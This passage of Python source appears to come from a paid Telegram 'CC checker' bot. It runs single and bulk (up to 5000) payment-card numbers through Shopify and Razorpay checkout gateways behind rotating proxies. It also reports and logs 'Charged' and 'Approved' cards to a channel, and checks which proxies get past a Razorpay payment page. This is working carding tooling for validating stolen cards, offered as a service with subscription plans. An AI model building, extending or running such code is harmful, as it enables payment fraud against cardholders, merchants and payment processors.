        ), buttons=[[Button.url("🏠 Join Group", GROUP_LINK, style="success")]], parse_mode='html')
        return
    sites = load_sites()
    proxies = load_proxies()

    if not sites:
        await event.reply(premium_emoji("❌ No sites available. Please contact admin."), parse_mode='html')
        return
    if not proxies:
        await event.reply(premium_emoji("❌ No proxies available. Please add proxies."), parse_mode='html')
        return

    cc_input = event.message.text.split(None, 1)[1].strip() if len(event.message.text.split(None, 1)) > 1 else ''
    cards = extract_cc(cc_input)

    if not cards:
        await event.reply(premium_emoji("❌ Invalid CC format. Use: <code>/cc card|mm|yy|cvv</code>"), parse_mode='html')
        return

    card = cards[0]

    # ─── ONE CHECK AT A TIME — block /cc if /chk or /mrz already running ─────
    if user_id in user_active_check:
        current_sess = user_active_check[user_id]
        _stype_map = {"chk": "🛒 Shopify Mass", "mrz": "💳 Razorpay Mass", "rz": "💳 Razorpay Single", "cc": "💳 Shopify Single"}
        session_type = _stype_map.get(current_sess['type'], "Active Check")
        await event.reply(premium_emoji(
            f"🚫 <b>Already Running!</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"⚡ <b>Active Session:</b>  {session_type}\n\n"
            f"Wait for it to finish first."
        ), parse_mode='html')
        return
    # ─────────────────────────────────────────────────────────────────────────
    checking_msg = (
        f"⏳ 𝐀 𝐘 𝐀 𝐍 𝐎 〆 𝐕𝟐 𝗜𝗦 𝗪𝗢𝗥𝗞𝗜𝗡𝗚 . . . .\n\n"
        f"💳 Card » <code>{card}</code>\n"
        f"🌐 Gateway » 𝙎𝙝𝙤𝙥𝙞𝙛𝙮 𝙋𝙖𝙮𝙢𝙚𝙣𝙩𝘀\n"
        f"🔍 Status » 𝘼 𝙎𝙚𝙭𝙮 𝙂𝙞𝙧𝙡 𝙄𝙨 𝙋𝙧𝙚𝙥𝙖𝙧𝙞𝙣𝙜 𝙃𝙚𝙧𝙨𝙚𝙡𝙛 𝙏𝙤 𝙃𝙖𝙫𝙚 𝙎𝙚𝙭 𝙒𝙞𝙩𝙝 𝙔𝙤𝙪...\n\n"
        f"⚡ Powered by @AYANOOXD"
    )
    status_msg = await event.reply(premium_emoji(checking_msg), parse_mode='html')

    # Mark user busy for single /cc
    _cc_session_key = f"cc_{user_id}_{status_msg.id}"
    user_active_check[user_id] = {'type': 'cc', 'session_key': _cc_session_key, 'chat_id': event.chat_id, 'msg_id': status_msg.id}

    try:
        # Single check also goes through global semaphore for tracking
        _cc_start = time.time()
        async with _global_api_semaphore:
            result = await check_card_with_retry(card, sites, proxies, max_retries=3, lane="single", uid=str(user_id))
        record_bot_response_time(time.time() - _cc_start)
        brand, bin_type, level, bank, country, flag = await get_bin_info(card.split('|')[0])
        increment_cc_used(user_id)

        if result['status'] == 'Charged':
            status_header = "💎 𝑪𝑯𝑨𝑹𝑮𝑬𝑫"
            await log_hit_to_channel(result, 'Charged', user_id, username, check_type="Single CC Check")
        elif result['status'] == 'Approved':
            status_header = "✅ 𝑨𝑷𝑷𝑹𝑶𝑽𝑬𝑫"
            await log_hit_to_channel(result, 'Approved', user_id, username, check_type="Single CC Check")
        elif result['status'] == 'Declined':
            status_header = "❌ 𝑫𝑬𝑪𝑳𝑰𝑵𝑬𝑫"
        elif result['status'] in ('Dead', 'Site Error'):
            # FIX: Dead/Site Error shown as ⚠️ DEAD SITE, not DECLINED
            status_header = "⚠️ 𝑫𝑬𝑨𝑫 𝑺𝑰𝑻𝑬"
        else:
            status_header = "❌ 𝑫𝑬𝑪𝑳𝑰𝑵𝑬𝑫"

        final_resp = (
            f"{status_header}\n\n"
            f"💳 CC      <code>{result['card']}</code>\n\n"
            f"🛒 Gateway  {result.get('gateway', 'Unknown')}\n"
            f"📝 Response {_display_message(result['message'])}\n"
            f"💸 Price    {result.get('price', '-')}\n\n"
            f"🆔 {brand} · {bin_type} · {level}\n"
            f"🏦 {bank}\n"
            f"🌍 {country} {flag}\n\n"
            f"💡 @AYANOOXD"
        )

        await safe_edit(status_msg, final_resp)

    except Exception as e:
        await safe_edit(status_msg, f"❌ Error: {e}")
    finally:
        # Release one-at-a-time lock for single /cc
        if user_id in user_active_check and user_active_check.get(user_id, {}).get('type') == 'cc':
            del user_active_check[user_id]


@bot.on(events.NewMessage(pattern=r'^/chk(?:\s|$)'))
async def check_command(event):
    user_id = event.sender_id
    chat_id = event.chat_id  # group mein = group ID, private mein = user ID

    try:
        sender = await event.get_sender()
        username = sender.username if sender.username else f"user_{user_id}"
    except Exception:
        username = f"user_{user_id}"

    check_status = can_check(user_id, event.is_private)
    if check_status == 'banned':
        await event.reply(premium_emoji(
            "𝗬𝗢𝗨 𝗔𝗥𝗘 𝗕𝗔𝗡𝗡𝗘𝗗\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "🚫  You have been banned from using this bot.\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "💡  Contact @AYANOOXD if this is a mistake"
        ), parse_mode='html')
        return
    if check_status == 'no_plan':
        await event.reply(premium_emoji(
            "𝗡𝗢 𝗣𝗟𝗔𝗡 𝗙𝗢𝗨𝗡𝗗\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "❌  You need a plan to check cards.\n"
            "📌  Use /plan to see available plans\n"
            "📌  Use /redeem CODE to activate"
        ), parse_mode='html')
        return
    if check_status == 'expired':
        await event.reply(premium_emoji(
            "𝗣𝗟𝗔𝗡 𝗘𝗫𝗣𝗜𝗥𝗘𝗗\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "⏰  Your plan has expired.\n"
            "📌  Use /plan to purchase a new plan\n"
            "📌  Or /redeem CODE to reactivate"
        ), parse_mode='html')
        return
    if check_status == 'group_only':
        await event.reply(premium_emoji(
            "𝗚𝗥𝗢𝗨𝗣 𝗢𝗡𝗟𝗬\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "🆓  Free Plan — Group checking only.\n"
            f"👇  Join group to check:\n"
            f"    {GROUP_LINK}\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "⚡  Upgrade: /plan"
        ), buttons=[[Button.url("🏠 Join Group", GROUP_LINK, style="success")]], parse_mode='html')
        return
    # ─── ONE CHECK AT A TIME RULE ─────────────────────────────────────────────
    if user_id in user_active_check:
        current = user_active_check[user_id]
        session_type = "🛒 Shopify" if current['type'] == 'chk' else "💳 Razorpay"
        await event.reply(premium_emoji(
            f"🚫 <b>Already Running!</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"⚡ <b>Active Session:</b>  {session_type}\n\n"
            f"You already have a check running.\n"
            f"Wait for it to finish, then start a new one.\n\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"💡 Use STOP button to cancel the current check."
        ), parse_mode='html')
        return
    # ──────────────────────────────────────────────────────────────────────────

    if not event.reply_to_msg_id:
        await event.reply(premium_emoji("❌ Please reply to a .txt file containing cards."), parse_mode='html')
        return

    reply_msg = await event.get_reply_message()
    if not is_text_reply_file(reply_msg):
        await event.reply(premium_emoji("❌ Please reply to a .txt file."), parse_mode='html')
        return

    if not load_sites():
        await event.reply(premium_emoji("❌ No sites available. Please contact admin."), parse_mode='html')
        return
    if not load_proxies():
        await event.reply(premium_emoji("❌ No proxies available. Please add proxies."), parse_mode='html')
        return

    status_msg = await event.reply(premium_emoji("🔄 Processing your file..."), parse_mode='html')

    file_path = await reply_msg.download_media()

    async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
        content = await f.read()

    # Always clean up downloaded file immediately after reading (disk leak fix)
    try:
        os.remove(file_path)
    except Exception:
        pass

    cards = extract_cc(content)

    if not cards:
        await safe_edit(status_msg, "❌ No valid cards found in file.")
        return

    if len(cards) > 5000:
        await safe_edit(status_msg, f"⚠️ File has {len(cards)} cards. Limiting to 5000.")
        cards = cards[:5000]

    # Per-session CC limit for ALL plans (FREE + Paid)
    # This replaces the old cumulative lifetime limit system.
    if user_id not in ADMIN_ID:
        users_data_chk = load_users_data()
        user_plan_chk  = users_data_chk.get(str(user_id), {}).get('plan', 'FREE')
        plan_data = PLANS.get(user_plan_chk, PLANS['FREE'])

        SESSION_LIMIT = plan_data['cc_limit']  # per-session max (same for FREE and paid)

        if len(cards) > SESSION_LIMIT:
            total_input = len(cards)
            cards = cards[:SESSION_LIMIT]
            plan_emoji = plan_data.get('emoji', '💎')
            await safe_edit(status_msg,
                f"{plan_emoji} <b>{user_plan_chk} Plan</b> — Tumhara {user_plan_chk} plan sirf <b>{SESSION_LIMIT}</b> cards per session check kar sakta hai.\n"
                f"📊 Total in file: {total_input}  ›  Checking first {SESSION_LIMIT}\n"
                f"💡 Session khatam hone ke baad phir se /chk karo — limit reset ho jayegi!",
                parse_mode='html'
            )
            await asyncio.sleep(2)

    # File already cleaned up after reading (line ~2129), skip redundant remove

    total_cards = len(cards)
    plan_workers = get_user_concurrency(user_id)
    users_data_plan = load_users_data()
    _plan_name = users_data_plan.get(str(user_id), {}).get('plan', 'FREE') if user_id not in ADMIN_ID else 'ADMIN'
    await safe_edit(status_msg, f"🔥 Starting check for <b>{total_cards}</b> cards...\n⚡ Plan: <b>{_plan_name}</b> | Workers: <b>{plan_workers}</b>")

    session_key = f"{user_id}_{status_msg.id}"
    active_sessions[session_key] = {'paused': False}

    # Register user for one-at-a-time check
    user_active_check[user_id] = {
        'type': 'chk',
        'session_key': session_key,
        'chat_id': chat_id,
        'msg_id': status_msg.id
    }

    # Pre-load once — avoids disk reads per card
    preloaded_sites   = load_sites()
    preloaded_proxies = load_proxies()

    all_results = {
        'charged': [],
        'approved': [],
        'dead': [],
        'total': total_cards,
        'checked': 0,
        'start_time': time.time(),
        'last_card': '',
        'last_response': '',
        'last_price': '-',
        'last_gateway': 'Unknown'
    }

    # Register user for traffic management
    await register_mass_user(user_id)

    try:
        queue = asyncio.Queue()
        for card in cards:
            queue.put_nowait(card)

        last_update_time = [time.time()]
        results_lock = asyncio.Lock()

        # ── Plan-based concurrency: each worker picks ONE card sequentially ──
        max_concurrent = get_user_concurrency(user_id)

        async def worker():
            """True parallel worker — grabs cards from queue until empty or stopped."""
            while session_key in active_sessions:
                # Race-condition-safe queue get
                try:
                    card = queue.get_nowait()
                except asyncio.QueueEmpty:
                    break

                # Pause support
                session_state = active_sessions.get(session_key)
                if not session_state:
                    queue.task_done()
                    break
                while session_state.get('paused', False):
                    await asyncio.sleep(0.5)
                    session_state = active_sessions.get(session_key)
                    if not session_state:
                        queue.task_done()
                        return

                if not preloaded_sites or not preloaded_proxies:
                    queue.task_done()
                    break

                _t0 = time.time()
                async with _global_api_semaphore:
                    res = await check_card_with_retry(card, preloaded_sites, preloaded_proxies, max_retries=2, lane="mass", uid=str(user_id))
                record_bot_response_time(time.time() - _t0)

                async with results_lock:
                    all_results['checked'] += 1
                    all_results['last_card'] = res.get('card', '')
                    all_results['last_response'] = res.get('message', '')
                    all_results['last_price'] = res.get('price', '-')
                    all_results['last_gateway'] = res.get('gateway', 'Unknown')

                    if res['status'] == 'Charged':
                        all_results['charged'].append(res)
                    elif res['status'] == 'Approved':
                        all_results['approved'].append(res)
                    else:
                        all_results['dead'].append(res)

                if res['status'] == 'Charged':
                    await send_realtime_hit(chat_id, res, 'Charged', username)
                    await log_hit_to_channel(res, 'Charged', user_id, username, check_type="Shopify Mass Check")
                elif res['status'] == 'Approved':
                    await send_realtime_hit(chat_id, res, 'Approved', username)
                    await log_hit_to_channel(res, 'Approved', user_id, username, check_type="Shopify Mass Check")

                queue.task_done()

                now = time.time()
                checked = all_results['checked']
                if (now - last_update_time[0] >= 4.0) or (checked % 5 == 0):
                    last_update_time[0] = now
                    if session_key in active_sessions:
                        try:
                            await update_progress(chat_id, user_id, status_msg.id, all_results, checked)
                        except Exception:
                            pass

        # ── True parallel workers via asyncio.gather ──────────────────────────
        # No polling loop: gather waits for ALL workers to finish naturally.
        # Stop button removes session_key → workers exit at next iteration.
        worker_tasks = [asyncio.create_task(worker()) for _ in range(max_concurrent)]

        async def _chk_stop_monitor():
            """Cancels workers the instant STOP is pressed (no 1s poll delay)."""
            while True:
                if session_key not in active_sessions:
                    for w in worker_tasks:
                        if not w.done():
                            w.cancel()
                    return
                await asyncio.sleep(0.3)

        _monitor = asyncio.create_task(_chk_stop_monitor())
        await asyncio.gather(*worker_tasks, return_exceptions=True)
        _monitor.cancel()
        try:
            await _monitor
        except asyncio.CancelledError:
            pass

        if session_key in active_sessions:
            await update_progress(chat_id, user_id, status_msg.id, all_results, all_results['checked'])

    except Exception as e:
        await bot.send_message(chat_id, premium_emoji(f"❌ An error occurred: {e}"), parse_mode='html')
    finally:
        # Unregister from traffic management
        await unregister_mass_user(user_id)

        if session_key in active_sessions:
            del active_sessions[session_key]

        # Clean up one-at-a-time lock
        if user_id in user_active_check:
            del user_active_check[user_id]

        # Update CC usage once at session end
        total_checked = len(all_results['charged']) + len(all_results['approved']) + len(all_results['dead'])
        if total_checked > 0:
            increment_cc_used(user_id, total_checked)

        try:
            await status_msg.delete()
        except Exception:
            pass

        if total_checked > 0:
            await send_final_results(chat_id, all_results)


@bot.on(events.NewMessage(pattern=r'^/addproxy(?:\s|$)'))
async def add_proxy_command(event):
    user_id = event.sender_id
    if not is_premium(user_id):
        await event.reply(premium_emoji("❌ Access Denied\n\nOnly premium users can use this."), parse_mode='html')
        return

    # Block if another proxy check is already running
    if current_proxy_check.get('tasks') and any(not t.done() for t in current_proxy_check.get('tasks', [])):
        await event.reply(premium_emoji(
            "⚠️ <b>Proxy check already running!</b>\n\n"
            "Please wait for it to finish or click <b>STOP</b> on that message."
        ), parse_mode='html')
        return

    try:
        text = event.message.text or ''
        parts = text.split(None, 1)
        rest = parts[1] if len(parts) > 1 else ''
        proxies_to_add = []

        # Support: direct command input, multiline input, or reply-to .txt file
        if rest.strip():
            proxies_to_add = parse_proxy_lines(rest)
        elif event.reply_to_msg_id:
            reply_msg = await event.get_reply_message()
            is_txt_file = False
            if reply_msg.file:
                fname = reply_msg.file.name or ''
                mime  = reply_msg.file.mime_type or ''
                is_txt_file = (
                    fname.lower().endswith('.txt')
                    or mime in ('text/plain', 'application/octet-stream')
                    or (not fname and mime.startswith('text/'))
                )
            if is_txt_file:
                try:
                    file_path = await reply_msg.download_media()
                    async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                        content = await f.read()
                    try:
                        os.remove(file_path)
                    except Exception:
                        pass
                    proxies_to_add = parse_proxy_lines(content)
                except Exception as dl_err:
                    await event.reply(premium_emoji(f"❌ File download failed: {dl_err}"), parse_mode='html')
                    return
            elif reply_msg.file:
                await event.reply(
                    premium_emoji("❌ <b>Unsupported file type.</b>\nPlease reply to a <code>.txt</code> file containing proxies."),
                    parse_mode='html'
                )
                return

        proxies_to_add = [p for p in proxies_to_add if p]

        if not proxies_to_add:
            help_text = (
                "🔌 <b>ADD PROXY — Help</b>\n"
                "━━━━━━━━━━━━━━━━━━━━━━\n"
                "📋 <b>Supported Formats:</b>\n"
                "  • <code>ip:port</code>\n"
                "  • <code>ip:port:user:pass</code>\n"
                "  • <code>http://ip:port</code>\n"
                "  • <code>http://user:pass@ip:port</code>\n"
                "  • <code>socks5://ip:port</code>\n"
                "━━━━━━━━━━━━━━━━━━━━━━\n"
                "⚡ <b>Usage:</b>\n"
                "  • <code>/addproxy ip:port:user:pass</code>\n"
                "  • Paste multiple proxies after <code>/addproxy</code>\n"
                "  • Reply to a <code>.txt</code> file → <code>/addproxy</code>\n"
                "━━━━━━━━━━━━━━━━━━━━━━\n"
                "💡 All proxies are auto-verified before adding."
            )
            await event.reply(premium_emoji(help_text), parse_mode='html')
            return

        # Deduplicate submitted list while preserving order
        proxies_to_add = list(dict.fromkeys(proxies_to_add))
        current_proxies_set = set(load_proxies())
        new_proxies = [p for p in proxies_to_add if p not in current_proxies_set]
        duplicate_count = len(proxies_to_add) - len(new_proxies)

        if not new_proxies:
            await event.reply(premium_emoji(
                f"♻️ <b>All Duplicates!</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n"
                f"📥 Submitted  » <b>{len(proxies_to_add)}</b>\n"
                f"♻️ Duplicates » <b>{duplicate_count}</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n"
                f"⚠️ All submitted proxies already exist in the DB."
            ), parse_mode='html')
            return

        total = len(new_proxies)
        bar_init = make_progress_bar(0, total)

        status_msg = await event.reply(
            premium_emoji(
                f"🔌 <b>PROXY IMPORT — Verifying</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n"
                f"📥 <b>Submitted</b>  » <b>{len(proxies_to_add)}</b>\n"
                f"🆕 <b>To Verify</b>  » <b>{total}</b>\n"
                f"♻️ <b>Duplicates</b> » <b>{duplicate_count}</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n"
                f"📊 <b>Progress</b>   » <code>0/{total}</code>\n"
                f"✅ <b>Working</b>    » <b>0</b>  |  ❌ <b>Dead</b> » <b>0</b>\n"
                f"⏱️ <b>Speed</b>      » —\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n"
                f"<code>{bar_init}</code>\n"
                f"⚡ Running live accuracy check with <b>40 threads</b>..."
            ),
            buttons=[[Button.inline("STOP", b"stop_proxy_check", style="danger")]],
            parse_mode='html'
        )

        alive_proxies = []
        dead_proxies = []
        last_edit_time = 0.0
        start_time = time.time()
        semaphore = asyncio.Semaphore(100)  # was 40 — more parallel proxy tests

        async def test_one_proxy(proxy):
            if current_proxy_check.get('stopped'):
                return {'proxy': proxy, 'status': 'skipped'}
            async with semaphore:
                return await test_proxy(proxy)

        tasks = [asyncio.create_task(test_one_proxy(p)) for p in new_proxies]

        # Register in global state for STOP button
        current_proxy_check['tasks'] = tasks
        current_proxy_check['alive_proxies'] = alive_proxies
        current_proxy_check['dead_proxies'] = dead_proxies
        current_proxy_check['status_msg'] = status_msg
        current_proxy_check['new_proxies'] = new_proxies
        current_proxy_check['stopped'] = False
        current_proxy_check['owner_id'] = user_id
        current_proxy_check['mode'] = 'add'

        for coro in asyncio.as_completed(tasks):
            if current_proxy_check.get('stopped'):
                break
            try:
                result = await coro
                if result.get('status') == 'alive':
                    alive_proxies.append(result.get('proxy', ''))
                elif result.get('status') != 'skipped':
                    dead_proxies.append(result.get('proxy', ''))
            except Exception:
                pass

            done_count = len(alive_proxies) + len(dead_proxies)
            now = time.time()
            elapsed = now - start_time
            speed = round(done_count / elapsed, 1) if elapsed > 0 else 0
            bar = make_progress_bar(done_count, total)

            if (done_count % 5 == 0 or done_count == total) and (now - last_edit_time >= 0.8 or done_count == total):
                last_edit_time = now
                await safe_edit(status_msg,
                    f"🔌 <b>PROXY IMPORT — Verifying</b>\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━\n"
                    f"📥 <b>Submitted</b>  » <b>{len(proxies_to_add)}</b>\n"
                    f"🆕 <b>To Verify</b>  » <b>{total}</b>\n"
                    f"♻️ <b>Duplicates</b> » <b>{duplicate_count}</b>\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━\n"
                    f"📊 <b>Progress</b>   » <code>{done_count}/{total}</code>\n"
                    f"✅ <b>Working</b>    » <b>{len(alive_proxies)}</b>  |  ❌ <b>Dead</b> » <b>{len(dead_proxies)}</b>\n"
                    f"⏱️ <b>Speed</b>      » {speed}/s\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━\n"
                    f"<code>{bar}</code>\n"
                    f"⏳ Testing remaining proxies...",
                    buttons=[[Button.inline("STOP", b"stop_proxy_check", style="danger")]]
                )

        # Don't write if stopped (stop callback already handled file writing)
        if not current_proxy_check.get('stopped') and alive_proxies:
            async with aiofiles.open(PROXY_FILE, 'a') as f:
                for proxy in alive_proxies:
                    await f.write(f"{proxy}\n")

        if not current_proxy_check.get('stopped'):
            elapsed_total = time.time() - start_time
            elapsed_str = f"{int(elapsed_total)}s"

            result_text = (
                f"✅ <b>PROXY IMPORT — Complete</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n"
                f"📦 <b>Submitted</b>    » <b>{len(proxies_to_add)}</b>\n"
                f"🆕 <b>New Checked</b>  » <b>{total}</b>\n"
                f"♻️ <b>Duplicates</b>   » <b>{duplicate_count}</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n"
                f"✅ <b>Added (Live)</b> » <b>{len(alive_proxies)}</b>\n"
                f"❌ <b>Rejected</b>     » <b>{len(dead_proxies)}</b>\n"
                f"⏱️ <b>Time Taken</b>   » <b>{elapsed_str}</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n"
            )
            if alive_proxies:
                result_text += f"🎉 <b>{len(alive_proxies)}</b> working proxies saved to DB!"
            else:
                result_text += "⚠️ No working proxies found. Nothing was added."

            await safe_edit(status_msg, result_text)

        # Reset global state
        current_proxy_check['tasks'] = []
        current_proxy_check['owner_id'] = None
        current_proxy_check['stopped'] = False

    except Exception as e:
        await event.reply(premium_emoji(f"❌ Error: {e}"), parse_mode='html')



@bot.on(events.NewMessage(pattern=r'^/rzpxy(?:\s|$)'))
async def rzpxy_command(event):
    """
    /rzpxy — Check proxies specifically against Razorpay payment page.
    Validates: page loads successfully + payment link present on
    https://razorpay.me/@innatemind
    Working = alive, else dead.
    """
    user_id = event.sender_id

    if not is_premium(user_id):
        await event.reply(premium_emoji("❌ Access Denied\n\nOnly premium users can use this."), parse_mode='html')
        return

    # Block if another rzpxy check is already running
    if current_rzpxy_check.get('tasks') and any(not t.done() for t in current_rzpxy_check.get('tasks', [])):
        await event.reply(premium_emoji(
            "⚠️ <b>RZProxy check already running!</b>\n\n"
            "Please wait for it to finish or click <b>STOP</b> on that message."
        ), parse_mode='html')
        return

    try:
        text = event.message.text or ''
        parts = text.split(None, 1)
        rest = parts[1] if len(parts) > 1 else ''
        proxies_to_check = []

        # Support: inline proxies, multiline, or reply to .txt file
        if rest.strip():
            proxies_to_check = parse_proxy_lines(rest)
        elif event.reply_to_msg_id:
            reply_msg = await event.get_reply_message()
            is_txt_file = False
            if reply_msg.file:
                fname = reply_msg.file.name or ''
                mime  = reply_msg.file.mime_type or ''
                is_txt_file = (
                    fname.lower().endswith('.txt')
                    or mime in ('text/plain', 'application/octet-stream')
                    or (not fname and mime.startswith('text/'))
                )
            if is_txt_file:
                try:
                    file_path = await reply_msg.download_media()
                    async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                        content_txt = await f.read()
                    try:
                        os.remove(file_path)
                    except Exception:
                        pass
                    proxies_to_check = parse_proxy_lines(content_txt)
                except Exception as dl_err:
                    await event.reply(premium_emoji(f"❌ File download failed: {dl_err}"), parse_mode='html')
                    return
            elif reply_msg.file:
                await event.reply(
                    premium_emoji("❌ <b>Unsupported file type.</b>\nPlease reply to a <code>.txt</code> file containing proxies."),
                    parse_mode='html'
                )
                return
            elif reply_msg.text:
                proxies_to_check = parse_proxy_lines(reply_msg.text)
        else:
            # No proxies given — load from DB
            proxies_to_check = load_proxies()

        proxies_to_check = [p for p in proxies_to_check if p]

        if not proxies_to_check:
            help_text = (
                "🏦 <b>RZPXY — Razorpay Proxy Checker Help</b>\n"
                "━━━━━━━━━━━━━━━━━━━━━━\n"
                "📋 <b>Supported Formats:</b>\n"
                "  • <code>ip:port</code>\n"
                "  • <code>ip:port:user:pass</code>\n"
                "  • <code>http://ip:port</code>\n"
                "  • <code>http://user:pass@ip:port</code>\n"
                "  • <code>socks5://ip:port</code>\n"
                "━━━━━━━━━━━━━━━━━━━━━━\n"
                "⚡ <b>Usage:</b>\n"
                "  • <code>/rzpxy ip:port:user:pass</code>\n"
                "  • Paste multiple proxies after <code>/rzpxy</code>\n"
                "  • Reply to a <code>.txt</code> file → <code>/rzpxy</code>\n"
                "  • Just <code>/rzpxy</code> → checks all saved proxies\n"
                "━━━━━━━━━━━━━━━━━━━━━━\n"
                "🌐 <b>Test Site:</b> <code>razorpay.me/@innatemind</code>\n"
                "✅ <b>Working:</b> Page loads + payment link active\n"
                "❌ <b>Dead:</b> Connection failed or page blocked"
            )
            await event.reply(premium_emoji(help_text), parse_mode='html')
            return

        # Deduplicate
        proxies_to_check = list(dict.fromkeys(proxies_to_check))
        total = len(proxies_to_check)
        bar_init = make_progress_bar(0, total)

        status_msg = await event.reply(
            premium_emoji(
                f"🏦 <b>RZPXY — Razorpay Proxy Checker</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n"
                f"🌐 <b>Test URL</b>      » <code>razorpay.me/@innatemind</code>\n"
                f"📦 <b>Total Proxies</b> » <b>{total}</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n"
                f"📊 <b>Progress</b>     » <code>0/{total}</code>\n"
                f"✅ <b>Working</b>      » <b>0</b>  |  ❌ <b>Dead</b> » <b>0</b>\n"
                f"⏱️ <b>Speed</b>        » —\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n"
                f"<code>{bar_init}</code>\n"
                f"⚡ Testing with <b>20 threads</b> on Razorpay site..."
            ),
            buttons=[[Button.inline("STOP", b"stop_rzpxy_check", style="danger")]],
            parse_mode='html'
        )

        alive_proxies = []
        dead_proxies  = []
        last_edit_time = 0.0
        start_time = time.time()
        semaphore = asyncio.Semaphore(50)  # was 20 — more parallel rzpxy tests

        async def test_one_rzpxy(proxy):
            if current_rzpxy_check.get('stopped'):
                return {'proxy': proxy, 'status': 'skipped'}
            async with semaphore:
                return await test_proxy_razorpay(proxy)

        tasks = [asyncio.create_task(test_one_rzpxy(p)) for p in proxies_to_check]

        # Register in global state for STOP button
        current_rzpxy_check['tasks']         = tasks
        current_rzpxy_check['alive_proxies'] = alive_proxies
        current_rzpxy_check['dead_proxies']  = dead_proxies
        current_rzpxy_check['status_msg']    = status_msg
        current_rzpxy_check['new_proxies']   = proxies_to_check
        current_rzpxy_check['stopped']       = False
        current_rzpxy_check['owner_id']      = user_id

        for coro in asyncio.as_completed(tasks):
            if current_rzpxy_check.get('stopped'):
                break
            try:
                result = await coro
                if result.get('status') == 'alive':
                    alive_proxies.append(result.get('proxy', ''))
                elif result.get('status') != 'skipped':
                    dead_proxies.append(result.get('proxy', ''))
            except Exception:
                pass

            done_count = len(alive_proxies) + len(dead_proxies)
            now = time.time()
            elapsed = now - start_time
            speed = round(done_count / elapsed, 1) if elapsed > 0 else 0
            bar = make_progress_bar(done_count, total)

            if (done_count % 5 == 0 or done_count == total) and (now - last_edit_time >= 0.8 or done_count == total):
                last_edit_time = now
                await safe_edit(status_msg,
                    f"🏦 <b>RZPXY — Razorpay Proxy Checker</b>\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━\n"
                    f"🌐 <b>Test URL</b>      » <code>razorpay.me/@innatemind</code>\n"
                    f"📦 <b>Total Proxies</b> » <b>{total}</b>\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━\n"
                    f"📊 <b>Progress</b>     » <code>{done_count}/{total}</code>\n"
                    f"✅ <b>Working</b>      » <b>{len(alive_proxies)}</b>  |  ❌ <b>Dead</b> » <b>{len(dead_proxies)}</b>\n"
                    f"⏱️ <b>Speed</b>        » {speed}/s\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━\n"
                    f"<code>{bar}</code>\n"
                    f"⏳ Testing against Razorpay payment page...",
                    buttons=[[Button.inline("STOP", b"stop_rzpxy_check", style="danger")]]
                )

        # Final result (if not stopped)
        if not current_rzpxy_check.get('stopped'):
            elapsed_total = time.time() - start_time
            elapsed_str = f"{int(elapsed_total)}s"
            pct_alive = round((len(alive_proxies) / total) * 100) if total > 0 else 0
            bar_final = make_progress_bar(total, total)

            result_text = (
                f"✅ <b>RZPXY — Check Complete</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n"
                f"🌐 <b>Test URL</b>         » <code>razorpay.me/@innatemind</code>\n"
                f"📦 <b>Total Checked</b>   » <b>{total}</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n"
                f"✅ <b>Working (RZPay)</b>  » <b>{len(alive_proxies)}</b>  ({pct_alive}%)\n"
                f"❌ <b>Dead / Blocked</b>   » <b>{len(dead_proxies)}</b>\n"
                f"⏱️ <b>Time Taken</b>       » <b>{elapsed_str}</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n"
                f"<code>{bar_final}</code>"
            )
            if alive_proxies:
                result_text += f"\n🎉 <b>{len(alive_proxies)}</b> proxies work on Razorpay!"
            else:
                result_text += "\n⚠️ No proxies work on Razorpay payment page."

            await safe_edit(status_msg, result_text)

            # ── Send working proxies as txt file ───────────────────────────
            if alive_proxies:
                tmp_alive = os.path.join('/tmp', f'rzpxy_working_{user_id}.txt')  # FIX #5
                async with aiofiles.open(tmp_alive, 'w') as _f:
                    await _f.write("\n".join(alive_proxies))
                await bot.send_file(
                    event.chat_id,
                    tmp_alive,
                    caption=premium_emoji(
                        f"✅ <b>RZPXY — Working Proxies</b>\n"
                        f"━━━━━━━━━━━━━━━━━━━━━━\n"
                        f"🌐 Site  » <code>razorpay.me/@innatemind</code>\n"
                        f"✅ Total » <b>{len(alive_proxies)}</b> working proxies"
                    ),
                    parse_mode='html',
                    attributes=[telethon.tl.types.DocumentAttributeFilename('rzpxy_working.txt')]
                )
                try:
                    os.remove(tmp_alive)
                except Exception:
                    pass

            # ── Send dead proxies as txt file ──────────────────────────────
            if dead_proxies:
                tmp_dead = os.path.join('/tmp', f'rzpxy_dead_{user_id}.txt')  # FIX #5
                async with aiofiles.open(tmp_dead, 'w') as _f:
                    await _f.write("\n".join(dead_proxies))
                await bot.send_file(
                    event.chat_id,
                    tmp_dead,
                    caption=premium_emoji(
                        f"❌ <b>RZPXY — Dead Proxies</b>\n"
                        f"━━━━━━━━━━━━━━━━━━━━━━\n"
                        f"🌐 Site  » <code>razorpay.me/@innatemind</code>\n"
